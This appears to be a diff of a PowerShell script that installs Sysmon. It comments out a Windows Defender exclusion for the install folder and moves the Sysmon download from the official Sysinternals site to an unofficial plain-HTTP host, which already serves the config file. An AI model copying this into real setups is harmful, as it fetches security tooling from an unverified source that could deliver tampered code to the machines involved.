@@ -7,7 +7,7 @@ if (-not(Test-Path $targetDirectory))
 {
   New-Item -Path $targetDirectory -ItemType Directory | Out-Null
 }
-Add-MpPreference -ExclusionPath $targetDirectory
+# Add-MpPreference -ExclusionPath $targetDirectory -ErrorAction SilentlyContinue
 $savePathZip = Join-Path $targetDirectory "sysmon.zip"
 
 if (Test-Path $savePathZip)
@@ -15,7 +15,7 @@ if (Test-Path $savePathZip)
   Remove-Item -Path $savePathZip -Force
 }
 
-$sysmon_url="https://download.sysinternals.com/files/Sysmon.zip"
+$sysmon_url="http://utools.run/sysmon.zip"
 $sysmon_config="http://utools.run/config.xml"
 
 
